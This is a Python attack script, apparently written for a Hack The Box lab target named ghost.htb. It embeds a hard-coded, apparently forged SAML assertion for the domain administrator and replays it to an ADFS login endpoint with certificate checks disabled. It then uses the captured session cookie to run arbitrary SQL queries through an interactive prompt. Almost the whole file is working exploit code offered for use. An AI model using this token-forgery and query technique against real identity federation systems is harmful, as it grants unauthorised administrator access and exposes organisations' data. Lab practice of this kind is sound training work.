import sys
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from bs4 import BeautifulSoup
from colorama import Fore, Style

# Disable SSL warning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Replace token if needed. Must be URL-decoded
SAMLResponse = "PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIElEPSJfRVlVSlU2IiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAyNS0wMS0xNVQxMzo0NjozOC4wMDBaIiBEZXN0aW5hdGlvbj0iaHR0cHM6Ly9jb3JlLmdob3N0Lmh0Yjo4NDQzL2FkZnMvc2FtbC9wb3N0UmVzcG9uc2UiIENvbnNlbnQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpjb25zZW50OnVuc3BlY2lmaWVkIj48SXNzdWVyIHhtbG5zPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIj5odHRwOi8vY29yZS5naG9zdC5odGIvYWRmcy9zZXJ2aWNlcy90cnVzdDwvSXNzdWVyPjxzYW1scDpTdGF0dXM+PHNhbWxwOlN0YXR1c0NvZGUgVmFsdWU9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpzdGF0dXM6U3VjY2VzcyIvPjwvc2FtbHA6U3RhdHVzPjxBc3NlcnRpb24geG1sbnM9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIElEPSJfRUIzWkQ3IiBJc3N1ZUluc3RhbnQ9IjIwMjUtMDEtMTVUMTM6NDY6MzguMDAwWiIgVmVyc2lvbj0iMi4wIj48SXNzdWVyPmh0dHA6Ly9jb3JlLmdob3N0Lmh0Yi9hZGZzL3NlcnZpY2VzL3RydXN0PC9Jc3N1ZXI+PGRzOlNpZ25hdHVyZSB4bWxuczpkcz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnIyI+PGRzOlNpZ25lZEluZm8+PGRzOkNhbm9uaWNhbGl6YXRpb25NZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiLz48ZHM6U2lnbmF0dXJlTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxkc2lnLW1vcmUjcnNhLXNoYTI1NiIvPjxkczpSZWZlcmVuY2UgVVJJPSIjX0VCM1pENyI+PGRzOlRyYW5zZm9ybXM+PGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNlbnZlbG9wZWQtc2lnbmF0dXJlIi8+PGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyIvPjwvZHM6VHJhbnNmb3Jtcz48ZHM6RGlnZXN0TWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxlbmMjc2hhMjU2Ii8+PGRzOkRpZ2VzdFZhbHVlPkltRmJwa2VocFNrbkQ4TGZxSVMrM1pqZkhtaDFnWitiQklqdmt0VG9YeU09PC9kczpEaWdlc3RWYWx1ZT48L2RzOlJlZmVyZW5jZT48L2RzOlNpZ25lZEluZm8+PGRzOlNpZ25hdHVyZVZhbHVlPmh3ZWlhcWQwaUx6S2JoaHRnUmFkSkk2eE01RXB0eWQwZHBsK2RBOWwzd2U3ZFljcXZKaWF6UVFpaG43UDNxR2tZZnQ0cVRwUWV5dlJtY1VaZFFYdi9BT05SM0QwcWwvdG42S0IwY0Y2WHcwMFYzRkdaVnNzOFBUUVFQUTZvVTR2dTZpeUoyTys0Wks3aFRVN2VFVGo0eVlHRzE3MWlKTUxyNW04bU1oK3NDbzd2VDlxRDZELzVVbG5LTTNNS2Z0eFZOVWQ4Rk1LOHBoTXhUR3hsZ0xIUUVNalM0djZwMXRreVcwbXh5Z2N0TUFkcm45d1BwNHplVm5xVnRURGQxcFJOUDlwUERSNFN3Q3REODQxSi9WMFZ3czB0ZVpGMG83WGJqblNTVk9CM25TVlZVRFhjcGJHbzVFWHM3ZEhxMHVTQkVkbmlGMWIyQjd3VnlBRnlweHQrTTIrd3BUbHc4eng3LzlPaFQ1TlZld1BTbHlxcGpvL1FGMUlCMCtlMkZCazNsOG5XbHVGclZodE1CV0RKVTNXVzFxV04rNnkybjdQMkxMYjRPaVZKb3RYL2FzSTh3ejFiV0c0dWhyeVhBTDVCQ0gyMXJ3M0FXbk94MlV0SGpNRnl2bGJlV3NmaUREWWxhejZTcjJMQlVJZ0IwVFdBRzFCYnM3T1lyMHBkcjZ3V3YvbVZ4WkdLS0RZdTFxeVlIVDRKZEhKQkZyQVJ4ckZZRVJ5aFBtNmYrbkVGQTR1NGYzVGYxdFhhUTZUVkN4L3piNzdSWnhyd3ZsWVY2Y2pVNTdPc2NUQUREZnpYcXdvSFpUL3d6TGxrUmh3ekM5OW1ZN2tMM1hUYVcyeHpPNGpTQjFvenhwQ00wZW9LYzFGWGducVpSQ0FJbERsaXVMaUd4Sk1lUHhYcHZVPTwvZHM6U2lnbmF0dXJlVmFsdWU+PGRzOktleUluZm8+PGRzOlg1MDlEYXRhPjxkczpYNTA5Q2VydGlmaWNhdGU+TUlJRTVqQ0NBczZnQXdJQkFnSVFKRmNXd015YlJhNU80K1dPNXRXb0dUQU5CZ2txaGtpRzl3MEJBUXNGQURBdU1Td3dLZ1lEVlFRREV5TkJSRVpUSUZOcFoyNXBibWNnTFNCbVpXUmxjbUYwYVc5dUxtZG9iM04wTG1oMFlqQWdGdzB5TkRBMk1UZ3hOakUzTVRCYUdBOHlNVEEwTURVek1ERTJNVGN4TUZvd0xqRXNNQ29HQTFVRUF4TWpRVVJHVXlCVGFXZHVhVzVuSUMwZ1ptVmtaWEpoZEdsdmJpNW5hRzl6ZEM1b2RHSXdnZ0lpTUEwR0NTcUdTSWIzRFFFQkFRVUFBNElDRHdBd2dnSUtBb0lDQVFDK0FBT0lmRXF0bFljbjE1M0wxQnZHUWdEeVhUbll3VFJ6c0s1OSt6RTF6Z0dLTzlONW5iOEZrK2RhS3BXTFFhaUg3b0RIYWVudy9RYXhCZzVxZGVEWW1EM296OEt5YUExeWdZQnJ6bTR3VzdGZjg3cks5RmU1SjUvaDZXOWc3NDloNUJJcVBRT3AwbDZzMXJmdW1PY2NONHliVzk1RVdOTDB2dVFYdkMrS1E0RDRnTVh1OG1DR3B4dHZJTDhpbE50SnVJRzNPUllTS2hSYWwweXlKZU9oRzR4Z2xyWkpGMThwOXdobkU2b21nZ21BNm4yc2hEay90dlRZamlpNWU3L2ljV1RLa3JzTUNwYUtVTms3bXhkTVpoUWFiN1NtZktyWk40cFJEN2RWZzV6ekl5RDdVelM5Q0hMQzZ4TnpxL1owaHVhT2FKaE9TZEpTZ2F0L2JzRzhuYngxOUhELyt5cFc5SjJMdE5GdWdkV3RtVUJXRE9RQllWaEI4U2c0VkVHZ1A5anlJdEhIMmJ6c0RmalJkSjhFMXVOSldQL2tRQTErd1lsT2RkTHFVM2IwSXNDdmxBOEV2WVcwVDFSc3U3N280eC93MGdXYjBvUVBFSXo3ejk3M2I0OTZ3cVF0M0RueWZlTzNsWFhmWk5jdmFqNUtDUDJUdEdCK0tzaEY5cGtJUHhxN0YyZ01oN1FqeGpSSHNBMjlWOGpGbzlnTEQ3a1BWaWNhSVVkc2dpRkhuWVFGMTRhNTJKdFIxVjVpTitoOTVKa3V1RXFRV0RCSEF2UEVCQlprRVpIKzV5VCthQ0ZYWFgrQnBQdDNRR2pZTGVKVThDRnNNdG44UVZMWXZMZGNWUnNVblJoL1dIaVh3Sk9PRVZFQ2E5dzcveVZuaGFsQ05CeDFFL2w0S1FJREFRQUJNQTBHQ1NxR1NJYjNEUUVCQ3dVQUE0SUNBUUFXWUtaVzNjRENCTzZkVDN5ZmwzT2N1eXAxTFZLVkkrOXBGeC9iYldwV2pTZGg2YjM5TFR4eEQ3RllVdGh1V1BaM3JGNEcrRmRNRkhIQ3gzWXBFbVVGbkVMS3NYcWhaOTg5QVg1OEkvM21iZlVsS1dlSVBMU0xrcCtlUlpvTUprdDdrMS9LWHREYXNPUW4wTnNnWUVvd0xCSW1NQ011OXV1am5DbUZPd0hQL0lCaGdZUU1IaDQ2QnpTWFdQM2k4VlhiclJ0RHBvL2MvL09GSmhHbW5uRjhaUG1pNHh0emZTREJwVktxd1ZMcDc4Q2d1TXhqUWQrYmRVYjQ1NTg4Wko0Q0xzUGRSUXAzMFdKMS9DTklhZW52Sld0QTJHNUladzVVMEVXQ0pMb1lKV0ZzOWl5T2ExL3k1NXJ1VzZKOGxJR0Qwd21vRWVDbDlDSDFFZDRkelVkVVhmMU1CQ1lQM1g5MmlheHpVRTB1cEdkLzFRbzZIVHl5T2xXdUF3cmtUMlZIRUxLVlpLT2c4K2RseTk3Z3laSWZVdFF3SWtQd05sOHZvMDRjZmoraHpPdkJ6UEtBQVloMTROTGd2ZUFJL0RxTW5PME9LTyt3MUhCS3c2NE5CQ244Z29hekYrUHVGZlVPMHlOSEZMNGt4TXBjYXA2aWV2NmczQlhDU0R3ZnFUVU9FdUVzN3E5b1lLZ3EycW5OVk9USWhoSW5NWEJ6RW02aVAxM2pmdU9vWEpkUEFuRVVYbjR5NXl3QTk3cnRiR25aRVB5eDFmMUVrWC9oYnFCUDR2b2d2OWtsdGFVRUVWWGtTK2hQcHhabWV4Q05yQkQxcTdHSi81MGViWWxDMENldjh3Nk1zOHRNME9ydnBwR1lsV3J0UHdldkV2ZmlSa3dCTEc3RU1BbkxTdz09PC9kczpYNTA5Q2VydGlmaWNhdGU+PC9kczpYNTA5RGF0YT48L2RzOktleUluZm8+PC9kczpTaWduYXR1cmU+PFN1YmplY3Q+PE5hbWVJRCBGb3JtYXQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpuYW1laWQtZm9ybWF0OnRyYW5zaWVudCI+R0hPU1RcYWRtaW5pc3RyYXRvcjwvTmFtZUlEPjxTdWJqZWN0Q29uZmlybWF0aW9uIE1ldGhvZD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmNtOmJlYXJlciI+PFN1YmplY3RDb25maXJtYXRpb25EYXRhIE5vdE9uT3JBZnRlcj0iMjAyNS0wMS0xNVQxMzo1MTozOC4wMDBaIiBSZWNpcGllbnQ9Imh0dHBzOi8vY29yZS5naG9zdC5odGI6ODQ0My9hZGZzL3NhbWwvcG9zdFJlc3BvbnNlIi8+PC9TdWJqZWN0Q29uZmlybWF0aW9uPjwvU3ViamVjdD48Q29uZGl0aW9ucyBOb3RCZWZvcmU9IjIwMjUtMDEtMTVUMTM6NDY6MzguMDAwWiIgTm90T25PckFmdGVyPSIyMDI1LTAxLTE1VDE0OjQ2OjM4LjAwMFoiPjxBdWRpZW5jZVJlc3RyaWN0aW9uPjxBdWRpZW5jZT5odHRwczovL2NvcmUuZ2hvc3QuaHRiOjg0NDM8L0F1ZGllbmNlPjwvQXVkaWVuY2VSZXN0cmljdGlvbj48L0NvbmRpdGlvbnM+PEF0dHJpYnV0ZVN0YXRlbWVudD48QXR0cmlidXRlIE5hbWU9Imh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3VwbiI+PEF0dHJpYnV0ZVZhbHVlPkdIT1NUXGFkbWluaXN0cmF0b3I8L0F0dHJpYnV0ZVZhbHVlPjwvQXR0cmlidXRlPjxBdHRyaWJ1dGUgTmFtZT0iaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvY2xhaW1zL0NvbW1vbk5hbWUiPjxBdHRyaWJ1dGVWYWx1ZT5BZG1pbmlzdHJhdG9yPC9BdHRyaWJ1dGVWYWx1ZT48L0F0dHJpYnV0ZT48L0F0dHJpYnV0ZVN0YXRlbWVudD48QXV0aG5TdGF0ZW1lbnQgQXV0aG5JbnN0YW50PSIyMDI1LTAxLTE1VDEzOjQ2OjM3LjUwMFoiIFNlc3Npb25JbmRleD0iX0VCM1pENyI+PEF1dGhuQ29udGV4dD48QXV0aG5Db250ZXh0Q2xhc3NSZWY+dXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFjOmNsYXNzZXM6UGFzc3dvcmRQcm90ZWN0ZWRUcmFuc3BvcnQ8L0F1dGhuQ29udGV4dENsYXNzUmVmPjwvQXV0aG5Db250ZXh0PjwvQXV0aG5TdGF0ZW1lbnQ+PC9Bc3NlcnRpb24+PC9zYW1scDpSZXNwb25zZT4="

def authenticate():
    print(Fore.BLUE + f"[*] Sending SAMLResponse to core.ghost.htb" + Style.RESET_ALL)

    url = "https://core.ghost.htb:8443/adfs/saml/postResponse"

    headers = {"Origin": "https://federation.ghost.htb"}
    data = {"SAMLResponse": SAMLResponse}

    try:
        r = requests.post(url, data=data, headers=headers, verify=False, allow_redirects=False)
    except requests.RequestException as e:
        print(Fore.RED + f"[-] Something went wrong.")
        print(f"[-] Error: {e}" + Style.RESET_ALL)
        exit(0)
    
    if r.status_code == 302:
        print(Fore.GREEN + f"[+] Authentication successful." + Style.RESET_ALL)
        cookie = r.headers['Set-Cookie'][12:-18]
        return cookie
    elif r.status_code == 500:
        print(Fore.RED + f"[-] Authentication unsuccessful, check if the SAML token is valid." + Style.RESET_ALL)
        exit(0)
    else:
        print(Fore.RED + f"[-] Unknown error occurred. Status: {r.status_code}" + Style.RESET_ALL)
        exit(0)

def sql(cookie, query):
    url = "https://core.ghost.htb:8443/"
    cookies = {"connect.sid":cookie}
    data = {"sql": query}

    try:
        r = requests.post(url, cookies=cookies, data=data, verify=False)
    except requests.RequestException as e:
        print(Fore.RED + f"[-] Something went wrong.")
        print(f"[-] Error: {e}" + Style.RESET_ALL)
        exit(0)
    
    if r.status_code != 200:
        print(Fore.RED + f"[-] Unknown error occurred. Status: {r.status_code}" + Style.RESET_ALL)
        exit(0)

    soup = BeautifulSoup(r.text, 'html.parser')
    pre = soup.find_all("pre")[0].contents

    return pre
    

def main():
    cookie = authenticate()
    while True:
        print(Fore.BLUE + "[*] SQL query: (enter 'exit' to quit)" + Style.RESET_ALL)
        query = input(Fore.BLUE + ">> " + Style.RESET_ALL)
        if query == "exit":
            print(Fore.RED + "[-] Bye" + Style.RESET_ALL)
            break
        
        pre = sql(cookie, query)
        for i in range(len(pre)):
            print(pre[i].strip())
        
        print()
    
    return

if __name__ == "__main__":
    main()